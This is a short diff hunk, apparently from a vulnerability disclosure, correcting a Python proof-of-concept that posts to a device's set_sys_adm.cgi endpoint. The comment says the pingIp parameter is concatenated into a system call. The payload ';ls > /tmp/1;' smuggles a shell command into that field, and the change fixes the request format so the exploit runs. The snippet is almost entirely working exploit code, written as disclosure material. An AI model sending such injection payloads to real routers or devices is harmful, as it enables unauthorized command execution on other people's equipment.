@@ -26,5 +26,5 @@ get value from pingIp, concate and call system, cause command injection
 url = "http://192.168.0.1/cgi-bin/set_sys_adm.cgi"
 payload = ';ls > /tmp/1;' + '\n'
 
-r = requests.post(url, data={ 'page=sysAdm&pingIp=' + payload})
+r = requests.post(url, data={ 'page':'sysAdm','pingIp': payload})
 ``` 
